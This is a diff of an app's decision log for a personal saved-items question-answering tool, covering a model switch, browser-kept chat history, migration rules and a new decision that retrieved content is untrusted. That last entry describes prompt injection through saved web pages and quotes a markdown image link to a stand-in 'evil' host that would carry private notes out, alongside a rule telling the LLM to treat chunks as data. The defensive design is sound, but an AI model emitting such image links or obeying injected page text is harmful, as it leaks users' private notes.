@@ -20,8 +20,10 @@ Major, hard-to-reverse decisions. Newest last.
 - Decision: fixed model and dimension.
 - Why: part of the chosen stack. Changing it later means a new column size and re-embedding all chunks.
 
-## D5: LLM: Groq llama-3.3-70b-versatile (2026-11-17)
-- Decision: answers are streamed via Langchain ChatGroq.
+## D5: LLM: Groq openai/gpt-oss-120b (2026-11-17, updated 2026-11-19)
+- Decision: answers are streamed via Langchain ChatGroq with `openai/gpt-oss-120b`, reasoning effort low.
+- Why: `llama-3.3-70b-versatile` (the 2026-11-17 choice) is no longer available on Groq. Low effort keeps the first token fast for short grounded answers.
+- Rejected: `openai/gpt-oss-20b` (weaker at following the citation rules).
 
 ## D6: URL extraction with Jina Reader (2026-11-17)
 - Decision: `r.jina.ai` gives the clean text and title. Content is cut off at 200k chars.
@@ -31,8 +33,14 @@ Major, hard-to-reverse decisions. Newest last.
 - Decision: APP_PASSWORD in the backend env. /login returns a JWT HS256 valid for 7 days, stored in localStorage.
 - Rejected: no auth (exposes the API keys' quota); Supabase Auth (overkill for one user).
 
-## D8: Single-turn Q&A, no history (2026-11-17)
-- Decision: no chat history is stored or sent to the LLM.
+## D8: Single-turn Q&A, one chat kept in the browser (2026-11-17, updated 2026-11-19)
+- Decision:
+  - every question is answered on its own; no history is sent to the backend or the LLM.
+  - the UI keeps one long chat in localStorage (last 100 turns), with a "Clear chat" button.
+  - a warning under the question box says earlier messages are not sent to the AI.
+- Why: the user wants to scroll back through past answers, but follow-up questions with history would need query rewriting and more tokens.
+- Trade-off: a follow-up like "and what about him?" will not work; the warning tells the user this. The chat is lost on another browser or after clearing site data.
+- Rejected: storing chats in the DB; many chats; sending history to the LLM (the 2026-11-17 version stored nothing).
 
 ## D9: Chunk-level citations, strict grounding (2026-11-17)
 - Decision: each top-5 chunk (similarity >= 0.5) becomes a numbered citation. With no match, the fixed "Not found in your saved items." is returned and the LLM is not called.
@@ -87,3 +95,11 @@ Major, hard-to-reverse decisions. Newest last.
 - Rule: during a deploy the old instance keeps running on the new schema, so each migration must stay compatible with the previous code (add first, remove in a later deploy).
 - Rule: never edit a migration file that has run anywhere; add a new file instead.
 - Rejected: running them by hand in the Supabase SQL editor; the Supabase CLI (`supabase db push`) from CI; a hand-written migrator (node-pg-migrate already does locking and tracking).
+
+## D17: Saved content is untrusted in the Ask flow (2026-11-19)
+- Decision:
+  - the prompt wraps each chunk in `<chunk n=".." title="..">` tags and tells the LLM to treat chunks as data, never as instructions.
+  - the frontend never renders images from the answer.
+- Why: saved web pages may hide instructions. An injected `![](https://evil/?d=<note text>)` would leak private notes as soon as the image loads.
+- Trade-off: answers cannot show images.
+- Rejected: trusting saved content as it is.
